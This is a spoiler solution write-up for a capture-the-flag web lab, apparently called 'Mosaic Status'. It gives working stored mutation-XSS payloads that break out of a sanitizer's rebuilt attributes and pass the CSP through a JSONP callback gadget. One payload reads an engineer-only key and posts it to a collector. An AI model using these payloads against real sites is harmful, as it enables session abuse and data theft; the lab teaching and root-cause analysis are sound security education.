# Solution — Mosaic Status

Full spoilers.

## Confirming the controls are real

Sign in as `kellan` and post the payloads that would work on a broken
app, then read the rendered HTML:

| You post | Page serves |
| --- | --- |
| `<script>alert(1)</script>` | `alert(1)` — tag dropped, text escaped |
| `<img src=x onerror=alert(1)>` | `<img src="x" />` — handler dropped |
| `<a href="javascript:alert(1)">x</a>` | `<a>x</a>` — scheme rejected |
| `<a href="&#106;avascript:alert(1)">x</a>` | `<a>x</a>` — entity-decoded, then rejected |

The allow-list works. And the CSP is on every response:

```
Content-Security-Policy: default-src 'self'; script-src 'self';
  style-src 'self' 'unsafe-inline'; img-src 'self' data:;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

No `unsafe-inline`, so even a surviving `onerror` would not fire. Two
independent controls, both doing their job. Attack the seam instead.

## Objective 1 — `HxBugLabs{r3s3r14l1z1ng_1s_wh3r3_s4n1t1z3rs_d13}`

### The bug

`sanitize.js` does three things in order: parse, filter, **rebuild**. The
rebuild is the problem.

```js
function decodeEntities(value) { /* &quot; -> " , &gt; -> > , ... */ }

// filtering happens on the DECODED value
const value = decodeEntities(rawValue);

// and then the tag is reassembled from those decoded values
function serializeTag(tag, attrs, selfClosing) {
  const rendered = attrs.map((a) => " " + a.name + '="' + a.value + '"').join("");
  return "<" + tag + rendered + (selfClosing ? " /" : "") + ">";
}
```

Decoding before inspection is correct — without it, `&#106;avascript:`
walks past the scheme check. Writing the decoded value back **without
re-encoding it** is the bug. A `"` inside an attribute value terminates
the attribute. A `>` terminates the tag.

So the sanitizer's own output contains markup that the sanitizer never
inspected, because it did not exist until after sanitisation finished.
That is mutation XSS: input that is safe when checked and unsafe when the
browser parses the result.

Watch it happen:

```
input:  <b title="&quot;&gt;&lt;script src=/a.js&gt;&lt;/script&gt;">hi</b>
output: <b title=""><script src=/a.js></script>">hi</b>
```

`&quot;` closed `title`. `&gt;` closed the `<b>` tag. Everything after is
raw HTML the allow-list never saw — including a `<script>` element,
which is not in `TAGS` and could never have got through the front door.

### Turning it into execution

You now control raw HTML, but the CSP still says `script-src 'self'`:
no inline script, no `data:`, no external origin. What you need is a
same-origin URL that returns attacker-controlled JavaScript.

The status page has one. `GET /api/legacy/uptime.js` is a JSONP endpoint
kept alive for two partner dashboards, and it reflects the callback name
straight into its response:

```bash
curl -s 'http://localhost:8085/api/legacy/uptime.js?callback=whatever'
# whatever({"window":"30d","uptime":99.982,...});
```

Nothing validates the callback, so it is an arbitrary same-origin
JavaScript generator — `'self'` covers it. Trailing `//` comments out the
`({...});` the endpoint appends.

### The payload

Prove execution against the canary. `window.__MOSAIC_BUILD` is set by
`/app.js` from a value regenerated on every boot, so only script that
actually ran in the page can produce it:

```html
<b title="&quot;&gt;&lt;script src=/api/legacy/uptime.js?callback=fetch(`/api/canary?build=`%2bwindow.__MOSAIC_BUILD)//&gt;&lt;/script&gt;">looks the same on our side</b>
```

Three encodings are doing three different jobs, and getting them straight
is most of the work in this objective:

- `&quot;` and `&gt;` — HTML entities, decoded by *the sanitizer*, which
  is what breaks out of the attribute and the tag.
- `%2b` — URL encoding for `+`, decoded by *Express* when it reads
  `req.query.callback`. A literal `+` in a query string means a space.
- backticks instead of quotes — the value sits inside `title="…"`, so a
  `"` would end it early and a `'` reads badly next to the rest.

Load the incident page in your own browser and check the network tab:

```
GET /api/legacy/uptime.js?callback=fetch(`/api/canary?build=`+window.__MOSAIC_BUILD)//  → 200
GET /api/canary?build=3f7013ca07faaf1a                                                  → 200
```

```json
{
  "executed": true,
  "note": "script ran in the page context under the deployed CSP",
  "flag": "HxBugLabs{r3s3r14l1z1ng_1s_wh3r3_s4n1t1z3rs_d13}"
}
```

### Root cause

Two failures, and the second is the one people forget:

1. **Sanitize-then-reserialize without re-encoding.** A sanitizer that
   rebuilds markup must escape on the way out with the same rigour it
   inspects on the way in. This exact class has produced repeated
   CVE-level bypasses in DOMPurify and in every hand-rolled sanitizer
   that copied its shape. The rule: **never write a decoded value back
   into a context that will be parsed again.**
2. **A CSP with a same-origin script gadget.** `script-src 'self'` is
   only as strong as the weakest same-origin URL that returns
   JavaScript. JSONP endpoints, Angular-style template files, upload
   directories serving `.js`, and open redirects on a whitelisted CDN
   all defeat it. `'self'` is not a boundary against an attacker who can
   already inject markup on your origin — that is why strict-dynamic and
   nonces exist.

## Objective 2 — `HxBugLabs{y0u_d0nt_n33d_th3_c00k13_y0u_h4v3_th3_br0ws3r}`

### The reframe

The engineer's cookie is `HttpOnly`, so `document.cookie` gives you
nothing. This stops a lot of people, and it should not: **you do not
need the credential if you have the browser that holds it.**

Every `fetch()` your script issues from that page is same-origin and
carries the engineer's cookie automatically. You are not stealing a
session — you are using one.

Find what their role reaches and yours does not:

```bash
curl -s -b jar http://localhost:8085/admin/api/rotation-key
# {"error":"engineer role required"}
```

### The payload

Same injection primitive, different JavaScript: fetch the engineer-only
endpoint, then post the response body to the collector.

```html
<b title="&quot;&gt;&lt;script src=/api/legacy/uptime.js?callback=fetch(`/admin/api/rotation-key`).then(r=%3er.text()).then(t=%3efetch(`/api/collect?d=`%2bencodeURIComponent(t)))//&gt;&lt;/script&gt;">any update here?</b>
```

Note `%3e` for the `>` in each arrow function. Written literally, that
`>` closes the `<script …>` tag mid-attribute and truncates your `src`.
URL-encoded, it survives the HTML parse and Express decodes it back when
the JSONP endpoint reads the callback. (Or avoid arrows entirely and use
`function(r){return r.text()}` — but then you need to deal with the
spaces, and encoding is the cleaner habit.)

Post it, then click **Report to on-call**. The bot signs in as the
engineer in a real headless Chromium and opens the page. Read your
collector:

```bash
curl -s -b jar http://localhost:8085/api/collect/log | python3 -m json.tool
```

```json
{
  "count": 1,
  "entries": [{
    "method": "GET",
    "userAgent": "Mozilla/5.0 (Macintosh; …) HeadlessChrome/152.0.0.0 …",
    "query": {
      "d": "{\"rotation\":\"week-14\",\"pagerEscalation\":\"+31 20 555 0148\",\"statuspageWriteKey\":\"HxBugLabs{y0u_d0nt_n33d_th3_c00k13_y0u_h4v3_th3_br0ws3r}\"}"
    }
  }]
}
```

The `HeadlessChrome` user agent is your proof that this fired in the
engineer's browser and not in yours.

### Root cause

The stored XSS is the bug; everything after it is consequence. But the
consequence is the part worth writing down, because it changes how you
report XSS on real programs:

- `HttpOnly` mitigates *cookie theft*, not XSS. It does not stop reading
  the DOM, issuing authenticated requests, changing account settings,
  registering a new MFA device, or exfiltrating any data the victim's
  role can reach.
- SameSite cookies do not help either — these requests are same-origin.
- The severity of a stored XSS is the union of everything the *highest-
  privileged viewer* of that page can do. Here, a customer-supplied
  comment executes with the on-call engineer's role. That is a privilege
  boundary crossed by a comment box.

## Notes for the report

File one report, and make the demonstrated action the headline:

> Stored XSS in incident comments (sanitizer re-serialisation bypass),
> escalated to arbitrary same-origin script execution via the legacy
> JSONP endpoint, executing in the session of any engineer who views the
> reported comment. Demonstrated by retrieving `/admin/api/rotation-key`,
> which the reporting account cannot reach.

Attach, in order:

1. The input you posted and the raw HTML the server returned — side by
   side. This is the whole finding in two lines, and it stops a triager
   from arguing the sanitizer works.
2. The network log showing `uptime.js?callback=…` returning your JS
   under the deployed CSP. Pre-empt "we have a CSP" by naming the gadget.
3. The collector entry with the `HeadlessChrome` user agent, proving
   cross-user execution rather than self-XSS.

Two fixes are worth recommending separately, because they are owned by
different teams: escape on output in the sanitizer, and delete or
callback-validate the JSONP endpoint. Either one alone leaves a real bug
standing.
